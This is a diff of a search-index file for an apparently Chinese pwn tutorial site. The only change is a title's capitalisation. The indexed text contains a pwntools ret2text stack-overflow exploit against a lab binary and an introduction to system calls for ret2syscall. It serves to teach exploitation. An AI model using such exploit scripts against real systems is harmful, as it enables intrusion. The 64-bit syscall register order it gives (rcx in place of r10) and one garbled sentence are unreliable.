@@ -19,7 +19,7 @@ gets 函数，遇到 \\n 截断，不保留 \\n 字符串后面添加 \\x00 f
 最后找getshell代码片段
 你可以直接用hint函数地址，也可以只用从给system函数传递参数处的指令开始，两者结果是一样的
 最后我们就可以编写攻击脚本了
-from pwn import* # 引入pwntools包 o = process(\u0026quot;./ret2text\u0026quot;) # 执行ret2text程序并获取其I/O接口 payload = b'a'*24 # 填充变量与函数返回地址的空隙 payload += p64(0x4005d6) # 0x4005d6是getshell代码片段地址，p64的作用是将地址打包成小端序填入栈单元 o.sendline(payload) # 发送payload，会在结尾加 '\\n' o.interactive() # 进入交互模式 `}),e.add({id:1,href:"/docs/exploit/stackoverflow/ret2syscall/",title:"Ret2syscall",description:`0x01 介绍 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
+from pwn import* # 引入pwntools包 o = process(\u0026quot;./ret2text\u0026quot;) # 执行ret2text程序并获取其I/O接口 payload = b'a'*24 # 填充变量与函数返回地址的空隙 payload += p64(0x4005d6) # 0x4005d6是getshell代码片段地址，p64的作用是将地址打包成小端序填入栈单元 o.sendline(payload) # 发送payload，会在结尾加 '\\n' o.interactive() # 进入交互模式 `}),e.add({id:1,href:"/docs/exploit/stackoverflow/ret2syscall/",title:"ret2syscall",description:`0x01 介绍 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
 我们可以看一下32位的系统调用号
 前部分是系统调用名称，比如 __NR_read 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 3 就是read的系统调用号0。64位的系统调用号也是同理。
 当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 ebx、ecx、edx、esi、edi ，对于64位来说顺序为 rdi、rsi、rdx、rcx、r8、r9 。我们以内联汇编的形式来实现一个简单的系统调用
